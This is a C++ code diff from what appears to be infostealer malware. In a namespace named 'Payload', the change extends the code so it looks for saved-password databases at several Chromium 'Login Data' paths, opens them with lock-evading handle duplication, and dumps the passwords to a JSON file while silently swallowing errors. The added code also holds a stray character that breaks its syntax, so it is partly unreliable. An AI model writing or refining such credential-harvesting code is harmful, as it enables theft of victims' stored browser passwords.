@@ -97,11 +97,27 @@ namespace Payload {
 
         try {
             // Passwords
-            auto loginPath = profilePath / "Login Data";
-            if (std::filesystem::exists(loginPath)) {
-                if (auto db = OpenDatabaseWithHandleDuplication(loginPath)) {
-                    ExtractPasswords(db, m_outputBase / browserName / profilePath.filename() / "passwords.json");
-                    sqlite3_close(db);
+            auto loginDataPaths = {
+                profilePath / "Login Data For Account",  // Currently
+                profilePath / "Login Data",               // legacy
+                profilePath / "Network" / "Login Data" 
+            };
+
+            bool loginDataProcessed = false;
+            for (const auto& loginPath : loginDataPaths) {
+                if (std::filesystem::exists(loginPath)) {
+                    if (auto db = OpenDatabaseWithHandleDuplication(loginPath)) {
+                        std::filesystem::path outputPath = m_outputBase / browserName / profilePath.filename() / "passwords.json";
+                    
+                        std::filesystem::create_directories(outputPath.parent_path());
+                        
+                        ExtractPasswords(db, outputPath);
+                        sqlite3_close(db);
+                        loginDataProcessed = true;
+                        break; 
+                    } else {a
+                        // std::cerr << "Error: " << loginPath << std::endl;
+                    }
                 }
             }
         } catch(...) {}
